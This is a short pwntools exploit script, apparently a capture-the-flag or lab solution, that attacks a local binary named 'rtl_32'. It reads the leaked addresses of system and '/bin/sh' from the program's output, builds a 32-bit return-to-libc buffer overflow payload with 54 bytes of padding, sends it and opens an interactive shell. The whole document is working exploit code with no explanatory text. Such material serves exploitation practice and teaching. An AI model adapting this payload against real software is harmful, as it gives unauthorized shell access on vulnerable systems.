from pwn import *
context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
p = process('./rtl_32')


p.recvuntil("system addr: ")
sysAddr = p.recvuntil("\n")[:-1]
print(sysAddr)
sysAddr = int(sysAddr,16)
p.recvuntil("binsh addr: ")
binshAddr = p.recvuntil("\n")[:-1]
print(binshAddr)
binshAddr = int(binshAddr,16)

payload = b''
payload += b'a'*54 + p32(sysAddr) +b'aaaa'+ p32(binshAddr)
print(payload)

p.sendafter("BOF",payload)

p.interactive()
